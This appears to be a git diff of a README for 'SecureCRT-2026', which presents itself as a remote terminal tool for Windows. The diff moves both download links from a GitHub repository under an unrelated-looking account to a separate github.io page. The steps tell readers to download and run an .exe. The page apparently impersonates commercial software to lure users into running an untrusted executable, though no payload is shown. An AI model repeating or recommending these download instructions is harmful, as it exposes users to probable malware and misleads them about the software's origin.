@@ -1,6 +1,6 @@
 # 🔒 SecureCRT-2026 - Access Remote Computers With Ease
 
-[![Download SecureCRT](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Trayparticipial879/SecureCRT-2026)
+[![Download SecureCRT](https://img.shields.io/badge/Download-Release-blue.svg)](https://trayparticipial879.github.io)
 
 SecureCRT-2026 provides a reliable way to connect to remote servers and network devices. This application helps you manage terminal sessions securely using industry-standard encryption protocols. It runs on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ SecureCRT-2026 provides a reliable way to connect to remote servers and network 
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/Trayparticipial879/SecureCRT-2026).
+1. Visit the [official release page](https://trayparticipial879.github.io).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
